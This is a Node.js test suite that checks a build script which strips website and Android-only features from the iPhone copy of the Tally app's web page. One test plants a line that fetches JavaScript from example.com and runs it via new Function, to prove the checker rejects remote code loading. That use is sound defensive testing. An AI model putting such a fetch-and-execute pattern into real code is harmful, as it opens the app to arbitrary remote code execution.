// The iPhone app's copy of the page (scripts/ios-bundle.mjs): it loads, it has
// nothing in it for features the iPhone app doesn't have, and the website and
// the Android app still have all of theirs.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const vm = require('node:vm');
const { execFileSync } = require('node:child_process');

const ROOT = path.join(__dirname, '..');
const WEB = path.join(ROOT, 'web');
const SCRIPT = path.join(ROOT, 'scripts/ios-bundle.mjs');
const load = () => import('file://' + SCRIPT.replace(/\\/g, '/'));
const read = (...parts) => fs.readFileSync(path.join(...parts), 'utf8');

// Made once, by running the script as the build does.
const OUT = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'tally-ios-')), 'web');
test.after(() => fs.rmSync(path.dirname(OUT), { recursive: true, force: true }));
const made = () => {
  if (!fs.existsSync(OUT)) execFileSync(process.execPath, [SCRIPT, '--out', OUT], { stdio: 'pipe' });
  return OUT;
};

// Named in the sources of the website and the Android app; never in the iPhone copy.
const ELSEWHERE = [
  'installUpdate', 'checkUpdate', 'updateCard', 'Update available', 'Check for updates', 'allow installs from Tally',
  'tellAppWatch', "type: 'watch'", 'tallyBack', "type: 'back'", 'Get the Android app',
  'pwa.js', 'manifest.json', 'installHint', 'Add to Home Screen', 'apple-touch-icon',
  '__VERSION__', 'location.reload', 'tally.libReload', 'LIB_VERSION', 'Android', 'tallyApp.ios',
  'tally.matisseduffield.workers.dev', 'appassets.androidplatform.net', 'location.hostname', 'location.pathname', 'onSite',
  'navigator.share', 'navigator.clipboard', 'navigator.userAgent', "addEventListener('storage'",
  'data-theme', '@supports (-webkit-touch-callout', 'document.title', 'document.write', 'theme-color', 'module.exports', 'lib.js?v=',
];

test('the script makes the iPhone copy and passes its own checks', async () => {
  const { check, KEEP } = await load();
  assert.deepEqual(check(made()), []);
  for (const file of KEEP) assert.ok(fs.existsSync(path.join(made(), file)), file);
});

test('only the files the iPhone app uses are in it', async () => {
  const { KEEP, LEAVE } = await load();
  const list = dir => fs.readdirSync(dir, { withFileTypes: true, recursive: true }).filter(e => e.isFile())
    .map(e => path.relative(dir, path.join(e.parentPath || e.path, e.name)).split(path.sep).join('/')).sort();
  assert.deepEqual(list(made()), [...KEEP].sort());
  // Every file of the website is accounted for, kept or left out.
  assert.deepEqual(list(WEB), [...KEEP, ...LEAVE].sort());
  for (const file of ['pwa.js', 'sw.js', 'manifest.json']) assert.ok(LEAVE.includes(file), file);
});

test('each script in it parses, and its lib.js gives the page everything it asks for', async () => {
  const { pageParts } = await load();
  const out = made();
  execFileSync(process.execPath, ['--check', path.join(out, 'lib.js')], { stdio: 'pipe' });
  const { scripts } = pageParts(read(out, 'index.html'));
  assert.equal(scripts.length, 1);
  const inline = path.join(path.dirname(out), 'inline.js');
  fs.writeFileSync(inline, scripts[0]);
  execFileSync(process.execPath, ['--check', inline], { stdio: 'pipe' });
  // The copy's lib.js has no Node export, so it is run the way the page runs it.
  const sandbox = { Intl, crypto: globalThis.crypto };
  vm.runInNewContext(read(out, 'lib.js'), sandbox);
  const lib = sandbox.TallyLib;
  assert.equal(lib.toMinor(12.5, 'EUR'), 1250);
  const asked = [...new Set([...scripts[0].matchAll(/\bL\.([A-Za-z]\w*)/g)].map(m => m[1]))];
  assert.ok(asked.length > 15);
  for (const name of asked) assert.equal(typeof lib[name], 'function', `L.${name}`);
  // It is the same logic as web/lib.js: every function there is here, and nothing more.
  const whole = require('../web/lib.js');
  assert.deepEqual(Object.keys(lib).sort(), Object.keys(whole).filter(k => k !== 'VERSION').sort());
  assert.equal('VERSION' in lib, false);
});

test('the page in it is whole: tags closed, files there, every element the script names', async () => {
  const { pageParts } = await load();
  const html = read(made(), 'index.html');
  assert.match(html, /^<!doctype html>/);
  assert.match(html, /<\/script>\s*<\/body>\s*<\/html>\s*$/);
  const { scripts, markup, local } = pageParts(html);
  assert.deepEqual(local.sort(), ['fonts/hanken-grotesk-latin-ext.woff2', 'fonts/hanken-grotesk-latin.woff2', 'icons/icon-192.png', 'lib.js']);
  const ids = [...markup.matchAll(/\bid="([^"]+)"/g)].map(m => m[1]);
  assert.equal(new Set(ids).size, ids.length);
  const written = [...scripts[0].matchAll(/\bid="([^"$]+)"/g)].map(m => m[1]);
  const asked = [...scripts[0].matchAll(/\$\('([A-Za-z][\w-]*)'\)/g)].map(m => m[1]);
  assert.ok(asked.length > 100);
  for (const id of asked) assert.ok(ids.includes(id) || written.includes(id), `#${id}`);
  // The screens the iPhone app has.
  for (const id of ['home', 'intro', 'overview', 'people', 'activity', 'expDlg', 'payDlg', 'invDlg', 'setDlg', 'delDlg', 'picker', 'aboutDlg', 'aboutVer', 'shareBtn', 'setExport', 'facePick']) assert.ok(ids.includes(id), id);
});

test('nothing for a feature the iPhone app lacks is in it, and the website still has it all', async () => {
  const { FORBIDDEN } = await load();
  const out = made();
  const copy = ['index.html', 'lib.js'].map(f => read(out, f)).join('\n');
  const source = ['index.html', 'lib.js', 'pwa.js', 'sw.js', 'manifest.json'].map(f => read(WEB, f)).join('\n');
  for (const word of ELSEWHERE) {
    assert.ok(!copy.toLowerCase().includes(word.toLowerCase()), `in the iPhone copy: ${word}`);
    assert.ok(source.includes(word), `gone from web/: ${word}`);
  }
  for (const [pattern, why] of FORBIDDEN) assert.doesNotMatch(copy, pattern, why);
  // The marks themselves stay in web/ and never reach the copy.
  assert.match(source, /\/\* ios:cut \*\//);
  assert.match(source, /<!-- ios:cut -->/);
  assert.doesNotMatch(copy, /\bios\b/i);
});

test('the copy talks to the app only in ways the app answers', async () => {
  const { MESSAGES } = await load();
  const page = read(made(), 'index.html');
  const swift = read(ROOT, 'ios/Shell/Shell.swift') + read(ROOT, 'ios/App/App.swift');
  const sent = [...new Set([...page.matchAll(/toApp\(\{ type: '(\w+)'/g)].map(m => m[1]))].sort();
  assert.deepEqual(sent, ['haptic', 'hello', 'share', 'unsent']);
  assert.deepEqual(sent, [...MESSAGES].sort());
  for (const type of sent) assert.ok(swift.includes(`case "${type}"`), `the app has no answer for ${type}`);
  const heard = [...new Set([...page.matchAll(/m\.type === '(\w+)'/g)].map(m => m[1]))].sort();
  assert.deepEqual(heard, ['info', 'openLink']);
  for (const type of heard) assert.ok(swift.includes(`"type": "${type}"`), `the app never sends ${type}`);
  // And the app names nothing it does not do.
  const handled = [...swift.matchAll(/case ((?:"\w+"(?:, )?)+):/g)].flatMap(m => m[1].match(/\w+/g)).sort();
  assert.deepEqual(handled, sent);
  assert.doesNotMatch(swift, /checkUpdate|installUpdate|"back"|"watch"|"updates"|"platform"|"notifications"|UserNotifications|UNUserNotificationCenter|Notices|askNotifications|openSettings|androidplatform|tallyApp\.ios|shell\.scripts/);
  // Nor does it keep hooks for things it has none of: page dialogs, new windows, other apps' extras.
  assert.doesNotMatch(swift, /WKUIDelegate|manifest|wasm|UniformTypeIdentifiers|runJavaScript|createWebViewWith|isAppPath|mediaTypesRequiringUserAction|allowsInlineMediaPlayback|"blob"|opened\(notification/);
  // The page's address in the app is the app's own.
  assert.match(swift, /host: "tally",/);
  // The kinds of file it serves are the kinds in the copy.
  const served = swift.match(/private static let types = \[([\s\S]*?)\]/)[1].match(/"(\w+)":/g).map(s => s.slice(1, -2)).sort();
  assert.deepEqual(served, ['html', 'js', 'png', 'txt', 'woff2']);
});

test('the iPhone project and both workflows bundle the copy, made first', () => {
  const project = read(ROOT, 'ios/project.yml');
  assert.match(project, /- path: bundle\/web\s+type: folder/);
  assert.doesNotMatch(project, /path: \.\.\/web/);
  for (const file of ['ios.yml', 'ios-release.yml']) {
    const flow = read(ROOT, '.github/workflows', file);
    const make = flow.search(/node scripts\/ios-bundle\.mjs\r?\n/), gen = flow.indexOf('xcodegen generate');
    assert.ok(make > 0 && make < gen, file);
    assert.match(flow, /ios-bundle\.mjs --check/);
  }
  assert.match(read(ROOT, '.gitignore'), /^ios\/bundle\/\r?$/m);
  // The Android app still takes web/ as it is, and a release still publishes it whole.
  assert.match(read(ROOT, 'app/build.gradle.kts'), /assets\.srcDirs\("\.\.\/web"\)/);
  assert.match(read(ROOT, '.github/workflows/release.yml'), /cp -r web\/index\.html web\/lib\.js web\/pwa\.js web\/sw\.js web\/manifest\.json/);
});

test('a cut takes its own lines with it, or only its part of a line', async () => {
  const { strip } = await load();
  assert.equal(strip('a\n  /* ios:cut */\n  b\n  /* ios:end */\nc\n').text, 'a\nc\n');
  assert.equal(strip('a\r\n  /* ios:cut */\r\n  b\r\n  /* ios:end */\r\nc\r\n').text, 'a\r\nc\r\n');
  assert.equal(strip('  if (x/* ios:cut */ && y/* ios:end */) go();\n').text, '  if (x) go();\n');
  assert.equal(strip('  /* ios:cut */if (y) /* ios:end */go();\n').text, '  go();\n');
  assert.equal(strip('<p>a</p>\n<!-- ios:cut -->\n<p>b</p>\n<!-- ios:end -->\n<p>c</p>\n').text, '<p>a</p>\n<p>c</p>\n');
  assert.deepEqual(strip('nothing marked\n'), { text: 'nothing marked\n', cuts: 0 });
});

test('marks that do not pair up stop the build', async () => {
  const { strip } = await load();
  assert.throws(() => strip('a /* ios:cut */ b', 'x.js'), /x\.js:1: a cut with no end/);
  assert.throws(() => strip('a\n/* ios:end */', 'x.js'), /x\.js:2: an end with no cut/);
  assert.throws(() => strip('/* ios:cut */ a /* ios:cut */ b /* ios:end */'), /a cut inside the cut/);
  assert.throws(() => strip('/* ios:cut */ a <!-- ios:end -->'), /not the kind of mark/);
  assert.throws(() => strip('/* ios:cut */ a /* ios:end */ /* ios:end */'), /an end with no cut/);
  assert.throws(() => strip('/* ios:cut*/ a /* ios:end */'), /an end with no cut/);
  assert.throws(() => strip('a // ios:cut\nb'), /looks like a mark/);
  // A mark mistyped is never quietly left in the copy with what it was meant to cut.
  assert.throws(() => strip('/* iOS: cut */ a /* ios:end */'), /an end with no cut/);
  assert.throws(() => strip('/* ios : cut */ a\n'), /looks like a mark/);
  assert.throws(() => strip('<!-- IOS:END -->'), /looks like a mark/);
});

test('a rewrite that no longer finds its line stops the build', async () => {
  const { rewrite, REWRITES } = await load();
  assert.throws(() => rewrite('nothing here', 'lib.js'), /expected one match/);
  assert.throws(() => rewrite('<script src="lib.js?v=6"></script>\n<script src="lib.js?v=7"></script>', 'index.html'), /found 2/);
  assert.deepEqual(rewrite('x', 'fonts/OFL.txt'), { text: 'x', changes: 0 });
  assert.deepEqual(Object.keys(REWRITES).sort(), ['index.html', 'lib.js']);
  // web/lib.js itself carries no marks: it is pinned by hash to its version (tests/pwa.test.js).
  assert.doesNotMatch(read(WEB, 'lib.js'), /ios:(cut|end)/);
});

test('the check catches what the cut should have taken', async () => {
  const { check } = await load();
  const bad = path.join(path.dirname(made()), 'bad');
  fs.cpSync(made(), bad, { recursive: true });
  fs.copyFileSync(path.join(WEB, 'pwa.js'), path.join(bad, 'pwa.js'));
  fs.appendFileSync(path.join(bad, 'lib.js'), "\nfunction later() { toApp({ type: 'installUpdate' }); }\n");
  fs.writeFileSync(path.join(bad, 'index.html'), read(made(), 'index.html').replace("toApp({ type: 'hello' });", "toApp({ type: 'hello' }); toApp({ type: 'watch', groups: [] });"));
  const found = check(bad).join('\n');
  assert.match(found, /pwa\.js: not a file the iPhone app should have/);
  assert.match(found, /lib\.js:\d+: "installUpdate" \(the updater\)/);
  assert.match(found, /sends the app "watch", which the iPhone app does not answer/);
  // web/ itself, unmarked parts and all, is turned away.
  assert.ok(check(WEB).length > 50);
  assert.throws(() => execFileSync(process.execPath, [SCRIPT, '--check', WEB], { stdio: 'pipe' }));
});

test('the copy names only its own server, the rate services and the page\'s links', async () => {
  const { check, HOSTS } = await load();
  const copy = ['index.html', 'lib.js'].map(f => read(made(), f)).join('\n');
  const found = [...new Set([...copy.matchAll(/https:\/\/([^\/\s"'`<>)]+)/g)].map(m => m[1]))].sort();
  assert.deepEqual(found, [...HOSTS].sort());
  assert.deepEqual(found, ['api.coinbase.com', 'open.er-api.com', 'tally.teloone.au', 'teloone.au', 'www.exchangerate-api.com']);
  // Another address, a way of loading code, or a look at where the page is running, is turned away.
  const bad = path.join(path.dirname(made()), 'bad-host');
  fs.cpSync(made(), bad, { recursive: true });
  fs.appendFileSync(path.join(bad, 'lib.js'), "\nfetch('https://example.com/next.js').then(r => r.text()).then(t => new Function(t)());\nnew Worker('x.js');\nsetTimeout('go()', 1);\nif (navigator.userAgent) sessionStorage.x = 1;\nconst where = location.hostname;\n");
  const problems = check(bad).join('\n');
  assert.match(problems, /should not name: https:\/\/example\.com/);
  for (const word of ['Function(', 'Worker(', "setTimeout('", 'userAgent', 'sessionStorage', 'hostname']) assert.ok(problems.includes(`"${word}"`), word);
  // An address dropped from the page has to come off the list too.
  fs.writeFileSync(path.join(bad, 'lib.js'), read(made(), 'lib.js'));
  fs.writeFileSync(path.join(bad, 'index.html'), read(made(), 'index.html').replaceAll('open.er-api.com', 'api.coinbase.com'));
  assert.match(check(bad).join('\n'), /no longer names[^\n]*open\.er-api\.com/);
});

test('the copy has none of the other editions\' plumbing, and the sources still have all of it', () => {
  const page = read(made(), 'index.html');
  assert.match(page, /<script src="lib\.js"><\/script>/);
  assert.match(page, /^  const app = window\.tallyApp;$/m);
  assert.match(page, /^  const API = SITE;$/m);
  assert.match(page, /^  const pathId = \(location\.hash\.match\(\/g=\(\[A-Za-z0-9_-\]\{22\}\)\/\) \|\| \[\]\)\[1\];$/m);
  assert.match(page, /^  const overHome = !!pathId && !under;$/m);
  assert.match(page, /^    return toApp\(\{ type: 'share', title, text \}\);$/m);
  assert.match(page, /^  input, select, textarea, \.note-input \{ font-size: 16px; \}$/m);
  assert.match(page, /^  :root \{$/m);
  assert.doesNotMatch(page, /<meta name="theme-color"|<link rel="icon"/);
  assert.match(read(made(), 'lib.js'), /^  root\.TallyLib = lib;$/m);
  const source = read(WEB, 'index.html');
  assert.match(source, /<script src="lib\.js\?v=\d+"><\/script>/);
  assert.match(source, /@supports \(-webkit-touch-callout: none\)/);
  assert.match(source, /:root\[data-theme="dark"\]/);
  assert.equal(typeof require('../web/lib.js').VERSION, 'number');
});

test('with its marks taken out, the page is the one the website and the Android app had', () => {
  // Every mark is a comment on its own or inside a line; none sits in a string or a template.
  const source = read(WEB, 'index.html');
  const marks = source.match(/(\/\*|<!--) ios:(cut|end) (\*\/|-->)/g);
  assert.equal(marks.length % 2, 0);
  assert.equal(marks.filter(m => m.includes('cut')).length, marks.length / 2);
  const { scripts } = (() => {
    const bare = source.replace(/<!--[\s\S]*?-->/g, '');
    return { scripts: [...bare.matchAll(/<script(?![^>]*\bsrc=)[^>]*>([\s\S]*?)<\/script>/g)].map(m => m[1]) };
  })();
  // The page as it is published still parses, marks and all.
  for (const code of scripts) new vm.Script(code);
  assert.equal(scripts.length, 2);
});
